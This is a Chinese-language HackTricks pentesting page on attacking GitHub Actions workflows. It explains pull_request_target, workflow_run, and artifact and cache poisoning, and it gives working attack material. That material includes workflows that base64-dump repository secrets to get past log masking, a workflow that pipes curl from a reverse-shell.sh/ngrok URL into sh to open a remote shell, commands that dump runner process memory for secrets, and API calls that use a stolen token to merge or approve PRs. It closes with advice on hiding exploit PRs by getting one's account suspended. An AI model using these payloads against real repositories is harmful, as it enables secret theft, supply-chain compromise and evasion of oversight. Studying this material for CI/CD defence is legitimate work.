# 滥用Github Actions

<details>

<summary><strong>从零到英雄学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

在本页面，您将找到：

* 攻击者设法访问Github Action的**所有影响的总结**
* 获取对action的**访问权限**的不同方法：
* 拥有**创建action的权限**
* 滥用与**pull request**相关的触发器
* 滥用**其他外部访问**技术
* 从已经受到威胁的仓库中**转移**
* 最后，关于**利用内部action的后渗透技术**的部分（引起上述影响）

## 影响总结

关于[**Github Actions的基本信息**](../basic-github-information.md#github-actions)，请参阅介绍。

如果您能够**执行任意Github actions/注入代码**到一个**仓库**中，您可能能够：

* **窃取**该仓库/组织的**秘密**。
* 如果您只能注入，您可以窃取工作流中已经存在的任何内容。
* 滥用**仓库权限**以访问AWS和GCP等其他平台。
* **在自定义工作器**中**执行代码**（如果使用了自定义工作器），并尝试从那里转移。
* **覆盖**仓库**代码**。
* 这取决于`GITHUB_TOKEN`的权限（如果有的话）。
* **危害** **部署**和其他**工件**。
* 如果代码正在部署或存储某些内容，您可以修改它并获得进一步的访问权限。

## GITHUB\_TOKEN

当管理员启用此选项时，会给出这个“**秘密**”（来自`${{ secrets.GITHUB_TOKEN }}`和`${{ github.token }}`）：

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

这个令牌与**Github应用程序**将使用的令牌相同，因此它可以访问相同的端点：[https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github应该发布一个[**流程**](https://github.com/github/roadmap/issues/74)，允许在GitHub内**跨仓库**访问，因此一个仓库可以使用`GITHUB_TOKEN`访问其他内部仓库。
{% endhint %}

您可以在此查看此令牌的可能**权限**：[https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

请注意，令牌在工作完成后**会过期**。\
这些令牌看起来像这样：`ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

您可以使用此令牌做一些有趣的事情：

{% tabs %}
{% tab title="合并PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="批准 PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="创建 PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
请注意，在多个场合中，您可能会在 **Github Actions 环境或秘密中找到 github 用户令牌**。这些令牌可能会赋予您对仓库和组织更多的权限。
{% endhint %}

<details>

<summary>在 Github Action 输出中列出秘密</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>使用秘密获取反向 shell</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

可以通过**检查日志**来检查在其他用户仓库中给予Github令牌的权限：

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## 允许执行

{% hint style="info" %}
这将是侵入Github操作的最简单方式，因为这种情况假设你有权限在组织中**创建新仓库**，或者拥有某个仓库的**写权限**。

如果你处于这种情况，你可以查看[操作后的渗透技术](./#post-exploitation-techniques-from-inside-an-action)。
{% endhint %}

### 通过创建仓库执行

如果组织成员可以**创建新仓库**并且你可以执行github操作，你可以**创建一个新仓库并窃取在组织级别设置的秘密**。

### 通过新分支执行

如果你可以在已经配置了Github操作的仓库中**创建新分支**，你可以**修改**它，**上传**内容，然后**从新分支执行该操作**。这样你可以**泄露仓库和组织级别的秘密**（但你需要知道它们是如何被称呼的）。

你可以使修改后的操作**手动**执行，当**PR被创建**时或者当**一些代码被推送**时（取决于你想要多显眼）：
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
不同的触发器可能允许攻击者**执行另一个仓库的 Github Action**。如果这些可触发的操作配置不当，攻击者可能会危害它们。
{% endhint %}

### `pull_request`

工作流触发器**`pull_request`**会在收到拉取请求时执行工作流，但有一些例外：默认情况下，如果这是您**第一次**进行**合作**，某些**维护者**需要**批准**工作流的**运行**：

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
由于**默认限制**是针对**首次**贡献者，您可以通过**修复一个有效的bug/错字**，然后发送**其他 PR 来滥用您新的 `pull_request` 权限**。

**我测试了这个，它不起作用**：~~另一个选项是用一个已经为项目做出贡献并删除了他账户的人的名字创建一个账户。~~
{% endhint %}

此外，默认情况下**防止写入权限**和**秘密访问**目标仓库，如[**文档**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)中提到的：

> 除了 `GITHUB_TOKEN`，当工作流从**分叉**的仓库触发时，**秘密不会传递给运行器**。**`GITHUB_TOKEN` 在来自分叉仓库的拉取请求中具有只读权限**。

攻击者可以修改 Github Action 的定义以执行任意操作并追加任意操作。然而，由于上述限制，他将无法窃取秘密或覆盖仓库。

{% hint style="danger" %}
**是的，如果攻击者在 PR 中更改将被触发的 github action，他的 Github Action 将被使用，而不是原始仓库中的那个！**
{% endhint %}

由于攻击者还控制着被执行的代码，即使 `GITHUB_TOKEN` 上没有秘密或写入权限，攻击者也可以例如**上传恶意工件**。

### **`pull_request_target`**

工作流触发器**`pull_request_target`**对目标仓库具有**写入权限**并且**可以访问秘密**（不需要请求权限）。

请注意，工作流触发器**`pull_request_target`** **在基础上下文中运行**，而不是 PR 提供的上下文（为了**不执行不受信任的代码**）。有关 `pull_request_target` 的更多信息，请[**查看文档**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target)。\
此外，有关这种特定危险用法的更多信息，请查看这篇 [**github 博客文章**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)。

它可能看起来因为**执行的工作流**是在**基础**中定义的，而**不是在 PR 中**，所以使用**`pull_request_target`**是**安全的**，但有一些情况并非如此。

这个将会**访问秘密**。

### `workflow_run`

[**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) 触发器允许在一个工作流 `完成`、`请求` 或 `进行中` 时从另一个工作流运行。

在这个例子中，一个工作流被配置为在单独的 "Run Tests" 工作流完成后运行：
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
根据文档：由 `workflow_run` 事件启动的工作流程能够**访问密钥和写入令牌，即使之前的工作流程没有这样做**。

如果这种工作流程**依赖**于可以通过**`pull_request`** 或 **`pull_request_target`** 被外部用户**触发**的**工作流程**，那么它可能会受到攻击。在[**这篇博客**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)中可以找到一些脆弱的例子。第一个例子是**`workflow_run`** 触发的工作流程下载攻击者的代码：`${{ github.event.pull_request.head.sha }}`\
第二个例子是**传递**一个**构件**从**不可信**的代码到**`workflow_run`** 工作流程，并以一种容易受到**RCE攻击**的方式使用这个构件的内容。

### `workflow_call`

待办事项

待办事项：检查当从 pull_request 执行时，使用/下载的代码是来自原始仓库还是来自 forked PR

## 滥用 Forked 执行

我们已经提到了所有外部攻击者可能管理使 github 工作流程执行的方式，现在让我们看看这些执行，如果配置不当，如何可能被滥用：

### 不可信的 checkout 执行

在 **`pull_request`** 的情况下，工作流程将在**PR 的上下文**中执行（因此它将执行**恶意 PR 的代码**），但需要有人首先**授权**，并且它将在一些[限制](./#pull_request)下运行。

在使用 **`pull_request_target` 或 `workflow_run`** 的工作流程中，如果它依赖于可以从 **`pull_request_target` 或 `pull_request`** 触发的工作流程，那么将执行原始仓库的代码，所以**攻击者无法控制执行的代码**。

{% hint style="danger" %}
然而，如果**动作**有一个**明确的 PR 检出**，它将**从 PR 获取代码**（而不是基础代码），它将使用攻击者控制的代码。例如（检查第12行，下载了 PR 的代码）：
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># 不安全。仅作为示例提供。
on:
pull_request_target

jobs:
build:
name: 构建和测试
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
谢谢！
</code></pre>

潜在的**不可信代码在 `npm install` 或 `npm build`** 期间被运行，因为构建脚本和引用的**包由 PR 的作者控制**。

{% hint style="warning" %}
一个搜索脆弱动作的 github dork 是：`event.pull_request pull_request_target extension:yml`，然而，即使动作配置不安全，也有不同的方式来安全地配置作业执行（比如使用关于生成 PR 的参与者的条件判断）。
{% endhint %}

### 上下文脚本注入 <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

注意，有一些[**github 上下文**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)的值是由创建 PR 的**用户**控制的。如果 github 动作使用这些**数据来执行任何操作**，它可能导致**任意代码执行**：

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB_ENV 脚本注入** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

从文档中：您可以通过定义或更新环境变量并将其写入 **`GITHUB_ENV`** 环境文件，使环境变量可用于工作流作业中的任何后续步骤。

如果攻击者能够在这个**env**变量中**注入任何值**，他可以注入环境变量，这些变量可以在后续步骤中执行代码，例如 **LD_PRELOAD** 或 **NODE_OPTIONS**。

例如（参见[**这个**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0)和[**这个**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)），想象一个工作流程，它信任一个上传的构件来存储其内容在 **`GITHUB_ENV`** 环境变量中。攻击者可以上传类似下面的内容来妥协它：

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### 脆弱的第三方 Github 动作

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

如[**这篇博客文章**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks)中提到的，这个 Github 动作允许访问来自不同工作流程甚至仓库的构件。

问题是，如果没有设置 **`path`** 参数，构件会在当前目录中解压，它可以覆盖后续可能使用或甚至执行的文件。因此，如果构件是脆弱的，攻击者可以滥用这一点来妥协信任构件的其他工作流程。

脆弱工作流程的例子：
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
```markdown
这可以通过以下工作流程进行攻击：
```
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## 其他外部访问

### 删除的命名空间仓库劫持

如果一个账户更改了它的名称，另一个用户可能在一段时间后注册相同的名称。如果一个仓库在**更改名称前拥有少于100个星标**，Github将允许新注册的用户使用相同的名称创建一个**与已删除仓库同名的仓库**。

{% hint style="danger" %}
因此，如果一个动作（action）正在使用一个不存在的账户的仓库，攻击者仍然有可能创建该账户并危害该动作。
{% endhint %}

如果其他仓库正在使用**这个用户仓库中的依赖项**，攻击者将能够劫持它们。这里有一个更完整的解释：[https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## 仓库转移

{% hint style="info" %}
在本节中，我们将讨论的技术可以让我们**从一个仓库转移到另一个仓库**，假设我们在第一个仓库中有某种形式的访问权限（请查看前一节）。
{% endhint %}

### 缓存投毒

在**同一分支中的工作流运行之间**会维护一个缓存。这意味着，如果攻击者**危害**了一个**包**，然后该包被存储在缓存中并被一个**权限更高**的工作流**下载**并执行，他也将能够**危害**那个工作流。

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### 制品投毒

工作流可能会使用**来自其他工作流甚至仓库的制品**，如果攻击者设法**危害**了上传制品的Github动作，该制品随后被另一个工作流使用，他就能够**危害其他工作流**：

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## 动作后的利用

### 通过OIDC访问AWS和GCP

查看以下页面：

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### 访问秘密 <a href="#accessing-secrets" id="accessing-secrets"></a>

如果您正在向脚本注入内容，了解如何访问秘密是很有趣的：

* 如果秘密或令牌被设置为**环境变量**，可以直接通过环境使用**`printenv`**访问。

<details>

<summary>在Github动作输出中列出秘密</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
<details>

<summary>获取带有秘密的反向 shell</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
<details>

* 如果密钥**直接在表达式中使用**，生成的shell脚本会**存储在磁盘上**，并且可以访问。
* ```bash
cat /home/runner/work/_temp/*
```
* 对于JavaScript操作，密钥通过环境变量发送
* ```bash
ps axe | grep node
```
*   对于**自定义操作**，风险可能会根据程序如何使用从**参数**获得的密钥而有所不同：

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### 滥用自托管运行器

找出哪些**Github Actions在非Github基础设施中执行**的方法是在Github Action配置yaml中搜索**`runs-on: self-hosted`**。

**自托管**运行器可能可以访问**额外敏感的信息**，其他**网络系统**（网络中的脆弱端点？元数据服务？）或者，即使它被隔离和销毁，**可能会同时运行多个操作**，恶意操作可能会**窃取其他操作的密钥**。

在自托管运行器中，也可以通过转储其内存来获取**来自**_**Runner.Listener**_**进程的密钥**，该进程将包含工作流程的所有密钥的任何步骤：

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

查看[**此文章以获取更多信息**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/)。

### Github Docker 镜像仓库

可以创建 Github 操作，**在 Github 内部构建并存储 Docker 镜像**。\
以下是一个可展开的示例：

<details>

<summary>Github 操作 构建 &#x26; 推送 Docker 镜像</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

正如您在前面的代码中看到的，Github 注册表托管在 **`ghcr.io`** 上。

拥有仓库读权限的用户随后可以使用个人访问令牌下载 Docker 镜像：
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
```markdown
然后，用户可以搜索 **Docker 镜像层中泄露的秘密：**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions 日志中的敏感信息

即使 **Github** 尝试在 actions 日志中**检测秘密值**并**避免显示**它们，但在执行 action 时可能生成的**其他敏感数据**不会被隐藏。例如，用秘密值签名的 JWT 除非[特别配置](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)，否则不会被隐藏。

## 掩盖你的行踪

（技术来自[**这里**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)）首先，任何在 Github 上提出的 PR 都清晰可见，对公众和目标 GitHub 账户都是如此。在 GitHub 上，默认情况下，我们**不能从互联网上删除 PR**，但有一个转折点。对于被 Github **暂停**的账户，他们的所有**PR 都会自动删除**并从互联网上移除。因此，为了隐藏你的活动，你需要让你的**GitHub 账户被暂停或让你的账户被标记**。这将**隐藏你在 GitHub 上的所有活动**（基本上移除你所有的利用 PR）

GitHub 上的一个组织非常积极地向 GitHub 报告账户。你需要做的就是在 Issue 中分享“一些东西”，他们会确保你的账户在 12 小时内被暂停 :p，这样你就在 github 上使你的利用行为变得不可见了。

{% hint style="warning" %}
组织唯一能发现他们被瞄准的方式是通过 SIEM 检查 GitHub 日志，因为从 GitHub UI 上看 PR 会被移除。
{% endhint %}

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

其他支持 HackTricks 的方式：

* 如果你想在 **HackTricks** 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享你的黑客技巧**。

</details>
```
